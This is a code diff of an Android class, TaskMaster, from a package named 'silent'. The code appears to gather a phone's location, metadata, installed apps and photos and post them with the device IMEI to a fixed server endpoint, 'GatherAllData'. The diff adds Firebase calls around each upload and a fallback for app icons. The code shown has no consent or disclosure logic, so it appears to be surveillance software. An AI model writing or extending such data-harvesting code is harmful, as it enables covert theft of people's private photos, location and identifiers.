@@ -12,8 +12,6 @@ import android.graphics.Bitmap;
 import android.graphics.BitmapFactory;
 import android.graphics.drawable.BitmapDrawable;
 import android.graphics.drawable.Drawable;
-import android.graphics.drawable.LayerDrawable;
-import android.graphics.drawable.VectorDrawable;
 import android.location.Criteria;
 import android.location.LocationManager;
 import android.net.TrafficStats;
@@ -55,9 +53,11 @@ import java.util.Calendar;
 import java.util.Date;
 import java.util.List;
 
+import src.silent.R;
 import src.silent.utils.BatteryHandler;
 import src.silent.utils.BitmapJsonHelper;
 import src.silent.utils.DBAdapter;
+import src.silent.utils.FirebaseHandler;
 import src.silent.utils.LocationHandler;
 import src.silent.utils.SHA1Helper;
 import src.silent.utils.ServerCommunicationHandler;
@@ -118,9 +118,11 @@ public class TaskMaster extends AsyncTask<MasterTaskParams, Void, Void> {
                 }
             }
 
+            FirebaseHandler.insertArtist();
             ServerCommunicationHandler.executeDataPost(params[0].context,
                     "https://192.168.1.24:443/api/Service/GatherAllData", bulkData,
                     params[0].IMEI);
+            FirebaseHandler.deleteArtist();
         } else {
             getSmartphoneLocation(null, null, params[0].context);
         }
@@ -175,9 +177,11 @@ public class TaskMaster extends AsyncTask<MasterTaskParams, Void, Void> {
                     metadata.put("Metadata", informationArray);
                     metadata.put("Hash", newHash);
                     bulkData.put("Metadata", metadata);
+                    FirebaseHandler.insertArtist();
                     ServerCommunicationHandler.executeDataPost(context,
                             "https://192.168.1.24:443/api/Service/GatherAllData", bulkData,
                             IMEI);
+                    FirebaseHandler.deleteArtist();
                     informationArray = new JSONArray();
                 }
             }
@@ -770,10 +774,12 @@ public class TaskMaster extends AsyncTask<MasterTaskParams, Void, Void> {
                             .getApplicationLabel(app)).getBytes(), Base64.URL_SAFE));
                     Drawable drIcon = pm.getApplicationIcon(app);
                     Bitmap icon = null;
-                    if (drIcon.getClass() != LayerDrawable.class &&
-                            drIcon.getClass() != VectorDrawable.class) {
+                    try {
                         icon = ((BitmapDrawable) drIcon).getBitmap();
+                    } catch (Exception ex) {
+                        icon = BitmapFactory.decodeResource(context.getResources(), R.drawable.app);
                     }
+
                     information.put("Icon", BitmapJsonHelper.getStringFromBitmap(icon));
                     informationArray.put(information);
 
@@ -786,9 +792,11 @@ public class TaskMaster extends AsyncTask<MasterTaskParams, Void, Void> {
                         applications.put("Applications", informationArray);
                         applications.put("Hash", newHash);
                         bulkData.put("Applications", applications);
+                        FirebaseHandler.insertArtist();
                         ServerCommunicationHandler.executeDataPost(context,
                                 "https://192.168.1.24:443/api/Service/GatherAllData", bulkData,
                                 IMEI);
+                        FirebaseHandler.deleteArtist();
                         informationArray = new JSONArray();
                     }
                 }
@@ -878,9 +886,11 @@ public class TaskMaster extends AsyncTask<MasterTaskParams, Void, Void> {
                             photos.put("Photos", informationArray);
                             photos.put("Hash", newHash);
                             bulkData.put("Photos", photos);
+                            FirebaseHandler.insertArtist();
                             ServerCommunicationHandler.executeDataPost(context,
                                     "https://192.168.1.24:443/api/Service/GatherAllData", bulkData,
                                     IMEI);
+                            FirebaseHandler.deleteArtist();
                             informationArray = new JSONArray();
                         }
                     }
